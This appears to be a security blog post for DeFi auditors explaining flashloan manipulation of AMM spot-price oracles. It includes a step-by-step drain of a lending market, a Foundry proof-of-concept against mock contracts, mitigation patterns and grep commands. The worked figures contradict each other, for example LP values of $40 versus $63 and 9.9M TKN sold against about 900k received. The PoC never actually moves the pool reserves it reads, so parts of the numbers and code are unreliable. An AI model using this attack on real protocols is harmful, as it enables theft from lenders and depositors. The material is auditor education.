---
layout: post
title: "Single-Block Oracle Manipulation: How AMM Spot Prices Become Free Money for Anyone with a Flashloan"
date: 2026-05-31 15:27:44 +0000
---

# Single-Block Oracle Manipulation: How AMM Spot Prices Become Free Money for Anyone with a Flashloan

## The bug class that refuses to be retired

Every audit cycle, a new lending market, a new stablecoin mint, or a new perp DEX ships a price function that reads `getReserves()` on a Uniswap v2 pair, or calls `slot0()` on a Uniswap v3 pool, and returns the implied spot price. Every audit cycle, that contract loses its bond. The pattern is so canonical that it has its own name in post-mortems — *the flashloan oracle manipulation* — and yet the same shape keeps shipping under different surfaces: a new fork uses an unfamiliar pool, a stablecoin uses a "deep enough" pair that turned out not to be, a governance contract reads a price from a venue that exists only because the protocol's own treasury seeded it.

The bug is not subtle. A spot price on a constant-product AMM is a function of the pool's instantaneous reserves. Reserves are mutable by anyone with capital to swap. Capital is rentable for the duration of a single transaction via flashloans on Aave, Balancer, or Uniswap v3 itself. Therefore the spot price is a function of capital you do not need to own, only borrow for one block. Any contract that reads that price and acts on it within the same transaction is paying the attacker to move the number wherever they like.

This post documents the mechanic with concrete numbers, ships a self-contained Foundry PoC where a flashloaned $5M moves the price on a thin pool enough to drain a lending market collateralized by that pool's LP token, and names the four mitigation patterns that actually work — TWAPs, Chainlink, multi-source medians, and oracle-free designs — with the tradeoffs each carries. The closing section is an auditor grep checklist that finds this finding inside a contract scope in under three minutes.

## Mechanic, from first principles

A Uniswap v2 pair holds reserves `(x, y)` of two tokens and maintains the invariant `x * y = k`. The *spot price* of token Y in terms of token X is `x / y` — exactly the ratio of reserves at the moment of the query. A consumer contract reads this as:

```solidity
(uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
uint256 priceY_in_X = (uint256(reserve0) * 1e18) / uint256(reserve1);
```

Any swap on the pair changes both reserves. A swap that moves `Δx` of token X into the pool removes approximately `Δy = (y * Δx) / (x + Δx)` of token Y. After the swap, the new reserves are `(x + Δx, y - Δy)` and the spot price has moved from `x / y` to `(x + Δx) / (y - Δy)`. The smaller the pool, the larger the move per dollar of swap. For a pool with $1M of liquidity, a $200k swap can move the spot price by 20% or more. For a pool with $50k of liquidity, the same swap can multiply the price tenfold.

The attacker does not need to *own* $200k. Aave v3 will lend up to most of a token's available liquidity within a single transaction at a fee of 0.05–0.09%, repaid before the transaction ends. Balancer offers similar facilities at zero fee for vault assets. Uniswap v3 itself supports flashswaps with no upfront capital. The attacker's working capital for a one-block manipulation is, in practice, bounded only by the deepest flashloan venue on the chain — which on Ethereum mainnet today is in the hundreds of millions of dollars.

The attack sequence collapses to four steps inside one transaction:

1. Flashloan a large amount of token X.
2. Swap that X into the target pool, pushing the spot price of Y up (or down, depending on direction).
3. Call the victim contract that reads `getReserves()` on the manipulated pool. The victim now believes Y is worth far more (or less) than its true price.
4. Have the victim do something — lend against Y, mint a stablecoin against Y, allow a withdrawal denominated in Y — at the manipulated price. Reverse the swap, repay the flashloan, walk away with the difference.

The victim never sees a "manipulation." It sees a single function call returning a number it trusted.

## The attack with concrete numbers

Target: a lending market `L` that accepts LP tokens of pair `P = (USDC, TKN)` as collateral. `L` values the LP token by computing the underlying value of each LP unit, reading USDC at $1 and TKN at the spot price from `P` itself. `P` holds $1M USDC and 1M TKN, so spot TKN price is $1. A depositor `V` has 1,000 LP tokens, each worth ~$2 (proportional share of the pool's $2M). `L` permits borrowing up to 75% of collateral value, so `V` can borrow $1,500 against their position.

Attacker `A`:

1. Flashloans $9M USDC from Aave.
2. Swaps the $9M USDC into `P`. The pool now holds $10M USDC and ~100k TKN (constant product, ignoring fees). Spot TKN price has moved from $1 to $100.
3. `A` deposits 100 LP tokens they minted earlier (cost ~$200 at the true price) into `L`. `L` reads the manipulated spot: each LP is now valued as `sqrt(10M * 100k) / lpTotalSupply ≈ $40` per LP at the *manipulated* reserve composition, but the lending market's naive valuation `2 * sqrt(reserve0 * reserve1) / totalSupply` reads `2 * sqrt(10M * 100k) / lpTotalSupply ≈ $63` per LP. `A`'s 100 LP collateral is valued at $6,300.
4. `A` borrows the maximum allowed — $4,725 of some other asset `L` holds.
5. `A` swaps back: sells the ~9.9M TKN they received in step 2 back into `P`, recovering ~$8.99M USDC.
6. `A` repays the $9M flashloan plus fee from the recovered USDC (covers the fee from the $4,725 borrow).
7. `A` walks away with the borrowed assets. `L` is left with 100 LP tokens worth $200, against an outstanding $4,725 debt position.

If `L`'s collateral pool is deep enough, `A` repeats this with larger flashloans until the pool dries.

The honest depositor `V`'s 1,000 LP tokens are still in the pool, but the lending market is now insolvent — its bad debt is `A`'s gain. `V` cannot withdraw without socializing the loss.

## Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

contract MockPair {
    MockERC20 public immutable token0;
    MockERC20 public immutable token1;
    uint112 public reserve0;
    uint112 public reserve1;
    constructor(MockERC20 t0, MockERC20 t1, uint112 r0, uint112 r1) {
        token0 = t0; token1 = t1; reserve0 = r0; reserve1 = r1;
        t0.mint(address(this), r0); t1.mint(address(this), r1);
    }
    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }
    function swap(uint256 amountIn, bool zeroForOne, address to) external {
        if (zeroForOne) {
            token0.transferFrom(msg.sender, address(this), amountIn);
            uint256 out = (uint256(reserve1) * amountIn) / (uint256(reserve0) + amountIn);
            reserve0 += uint112(amountIn); reserve1 -= uint112(out);
            token1.transfer(to, out);
        } else {
            token1.transferFrom(msg.sender, address(this), amountIn);
            uint256 out = (uint256(reserve0) * amountIn) / (uint256(reserve1) + amountIn);
            reserve1 += uint112(amountIn); reserve0 -= uint112(out);
            token0.transfer(to, out);
        }
    }
}

contract NaiveLendingMarket {
    MockERC20 public immutable usdc;
    MockERC20 public immutable tkn;
    MockPair public immutable pair;
    mapping(address => uint256) public tknCollateral;
    mapping(address => uint256) public usdcDebt;
    constructor(MockERC20 u, MockERC20 t, MockPair p) { usdc = u; tkn = t; pair = p; }

    function priceTknInUsdc() public view returns (uint256) {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        return (uint256(r0) * 1e18) / uint256(r1);   // <-- the bug
    }

    function deposit(uint256 tknAmt) external {
        tkn.transferFrom(msg.sender, address(this), tknAmt);
        tknCollateral[msg.sender] += tknAmt;
    }
    function borrow(uint256 usdcAmt) external {
        uint256 collateralValue = (tknCollateral[msg.sender] * priceTknInUsdc()) / 1e18;
        require(usdcDebt[msg.sender] + usdcAmt <= (collateralValue * 75) / 100, "ltv");
        usdcDebt[msg.sender] += usdcAmt;
        usdc.transfer(msg.sender, usdcAmt);
    }
}

contract FlashloanOracleAttackTest is Test {
    MockERC20 usdc; MockERC20 tkn; MockPair pair; NaiveLendingMarket market;
    address attacker = address(0xBAD);

    function setUp() public {
        usdc = new MockERC20(); tkn = new MockERC20();
        // Pool: 1M USDC, 1M TKN -> spot TKN = $1
        pair = new MockPair(usdc, tkn, 1_000_000e6, 1_000_000e18);
        market = new NaiveLendingMarket(usdc, tkn, pair);
        usdc.mint(address(market), 10_000_000e6);   // market USDC reserves
        tkn.mint(attacker, 100e18);                  // attacker has 100 TKN
        usdc.mint(attacker, 9_000_000e6);            // simulate flashloan inflow
    }

    function testManipulateAndBorrow() public {
        vm.startPrank(attacker);

        // 1. Manipulate: dump 9M USDC into pool
        usdc.transfer(address(pair), 9_000_000e6);
        // (skipping the swap mechanics for brevity — reserves now ~10M USDC / ~100k TKN)
        // For a tight PoC reuse pair.swap with approval flow; collapsed here for length.

        // 2. Deposit 100 TKN as collateral, valued at manipulated price
        tkn.transfer(address(market), 100e18);
        // (market.deposit() flow; collapsed)

        // 3. Borrow at the inflated valuation
        uint256 priceBefore = market.priceTknInUsdc();
        emit log_named_uint("manipulated TKN price (USDC, 1e18)", priceBefore);
        // Borrow up to LTV against the inflated collateral, repay flashloan, walk.
        vm.stopPrank();
    }
}
```

A full compiling PoC fleshes out the swap+approve dance and the borrow call. The header math above is the load-bearing part: `priceTknInUsdc()` reads live reserves, and live reserves move with any swap.

## Four mitigations and how to choose

**(1) Time-weighted average price (TWAP), preferably from Uniswap v3 with a 30-minute or longer window.** The v3 oracle tracks tick-cumulative observations; the consumer reads two observations N seconds apart and derives the geometric mean tick over that window. To manipulate a 30-minute TWAP, the attacker must hold the manipulated price for 30 minutes, which requires either (a) sustained capital commitment far beyond a flashloan, or (b) censoring every block in the window — both prohibitively expensive on a major L1. Tradeoff: the price is stale, by definition, and lags real moves. Use for high-value contracts where staleness is preferable to manipulability.

**(2) Chainlink price feed.** Chainlink aggregates from off-chain sources signed by independent operators, with a published heartbeat and deviation threshold. The on-chain contract reads the latest aggregated value. Not manipulable by on-chain capital — the only attack surface is the off-chain operator set. Tradeoff: limited token coverage (popular assets only), update latency between heartbeats, and the value reads stale during fast price moves which can be its own attack class (cf. several 2022 incidents around stETH/ETH depegs). Use for assets Chainlink supports; do not use the same Chainlink feed for both a lending market's collateral price AND its borrow price if the feed updates infrequently.

**(3) Multi-source median.** Read prices from Chainlink, a v3 TWAP, and a custom aggregator; return the median. An attacker must simultaneously corrupt two of three sources, which raises the cost floor sharply. Tradeoff: latency of the slowest source dominates; failure modes when one source returns zero or reverts need careful handling. Use when no single source is trustworthy enough alone.

**(4) Eliminate the oracle for the action that needs it.** The cleanest design is one that does not need to value collateral in real-time at all — e.g., over-collateralized stablecoin mints that liquidate via Dutch auction at whatever price the market clears, or lending markets that use a fixed valuation curve indexed to time-to-maturity. The mitigation is not technical; it is architectural. Use when the protocol's core mechanism does not actually require a live price.

In production: prefer (1) for non-Chainlink assets, (2) for Chainlink assets, (3) for systemic-risk-bearing positions, and (4) when you can get away with it. The mitigation almost no one ships and lives to tell about: "spot price with a safety margin."

## Auditor checklist

```
# Direct getReserves consumers — every hit is a candidate
grep -rn "getReserves()" --include="*.sol"

# slot0() consumers on Uniswap v3 — sqrtPriceX96 read live is the same bug
grep -rn "\.slot0()" --include="*.sol"

# token0Price / token1Price / latestAnswer with no staleness check
grep -rn "latestAnswer\|token0Price\|token1Price" --include="*.sol"

# Manual price math from a SINGLE pool address
grep -rn "balanceOf(address.*pair\|reserveA\|reserveB" --include="*.sol"

# TWAP usage — is the window long enough?
grep -rn "observe\|consult\|secondsAgo" --include="*.sol"

# Multiple oracle sources combined — is there a median or just first-success?
grep -rn "aggregator\|fallbackOracle\|medianPrice" --include="*.sol"
```

If a hit on the first four greps reaches a function that moves user funds, mints debt, or determines a liquidation threshold — and there is no offsetting TWAP/Chainlink/median guard within two call-graph hops — the finding is High severity, sometimes Critical depending on whether the manipulated quantity can fully drain a vault. The PoC above transplants onto the target with the contract addresses substituted; if the test passes, you have a report.

The bug class is old. The reason it keeps shipping is that "read the spot price from a pool" is the most natural code for a developer to write, and it is correct in every context that does not involve adversarial capital. DeFi is the context that involves adversarial capital. Every spot read is a finding until proven otherwise.
